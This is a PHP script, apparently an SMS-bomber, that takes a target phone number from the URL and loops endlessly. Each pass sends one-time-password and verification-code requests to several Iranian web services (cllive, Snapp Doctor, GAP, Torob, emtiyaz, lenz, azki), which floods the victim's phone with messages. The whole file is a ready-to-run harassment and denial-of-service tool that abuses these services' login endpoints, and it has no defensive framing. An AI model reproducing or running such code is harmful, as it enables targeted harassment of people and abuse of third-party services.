<?php
set_time_limit(1000);
if (isset($_GET['target'])) {
	$target = $_GET['target'];
	while (True) {
		//cllive
		$url1 = 'https://api.cllive.ir/authentication/otp';
		// Create a new cURL resource
		$ch1 = curl_init($url1);
		// Setup request to send json via POST
		$payload1 = '{"msisdn":"0'.$target.'"}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch1, CURLOPT_POSTFIELDS, $payload1);
		// Set the content type to application/json
		curl_setopt($ch1, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result1 = curl_exec($ch1);
		// Close cURL resource
		curl_close($ch1);

		//Snap Doctor
		file_get_contents('https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0'.$target.'/sms?cCode= 98');

		//GAP
		file_get_contents('https://core.gap.im/v1/user/add.json?mobile=0'.$target);

		//Torob
		file_get_contents('https://api.torob.com/a/phone/send-pin/?phone_number=0'.$target);

		//emtiyaz
		$url2 = 'https://web.emtiyaz.app/json/login';
		$params2 = [
			'send' => '1',
			'cellphone' => '0'.$target
		];
		$ch2 = curl_init($url2);
		$parameters2 = http_build_query($params2);
		curl_setopt($ch2, CURLOPT_POST, true);
		curl_setopt($ch2, CURLOPT_POSTFIELDS, $parameters2);
		curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch2);
		curl_close($ch2);

		//lenz
		$url3 = 'https://app.lenz.ir:64014/api/v2/auth/register/otp/generate';
		// Create a new cURL resource
		$ch3 = curl_init($url3);
		// Setup request to send json via POST
		$payload3 = '{"msisdn":"0'.$target.'"}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch3, CURLOPT_POSTFIELDS, $payload3);
		// Set the content type to application/json
		curl_setopt($ch3, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch3, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result3 = curl_exec($ch3);
		// Close cURL resource
		curl_close($ch3);

		//azki
		file_get_contents('https://www.azki.com/prod/api/api/customer/register/check-phone-number?phoneNumber=azki_0'.$target);
	}
}

?>